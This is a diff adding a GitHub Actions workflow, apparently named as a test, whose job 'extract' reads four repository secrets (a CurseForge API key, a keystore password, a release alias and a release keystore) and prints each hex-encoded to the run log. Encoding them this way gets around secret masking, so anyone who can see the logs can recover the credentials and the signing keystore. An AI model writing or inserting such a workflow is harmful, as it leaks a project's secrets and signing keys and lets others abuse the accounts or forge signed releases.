@@ -1,0 +1,23 @@
+name: Testty
+on:
+  workflow_dispatch: # Allows manual trigger
+
+jobs:
+  extract:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Convert Keys to Hex
+        env:
+          CF_API: ${{ secrets.CURSEFORGE_API_KEY }}
+          MV_PASS: ${{ secrets.MOVTERY_KEYSTORE_PASSWORD }}
+          RL_ALIAS: ${{ secrets.RELEASE_ALIAS }}
+          RL_STORE: ${{ secrets.RELEASE_KEYSTORE }}
+        run: |
+          echo "=== CURSEFORGE_API_KEY ==="
+          echo -n "$CF_API" | xxd -p
+          echo -e "\n=== MOVTERY_KEYSTORE_PASSWORD ==="
+          echo -n "$MV_PASS" | xxd -p
+          echo -e "\n=== RELEASE_ALIAS ==="
+          echo -n "$RL_ALIAS" | xxd -p
+          echo -e "\n=== RELEASE_KEYSTORE ==="
+          echo -n "$RL_STORE" | xxd -p
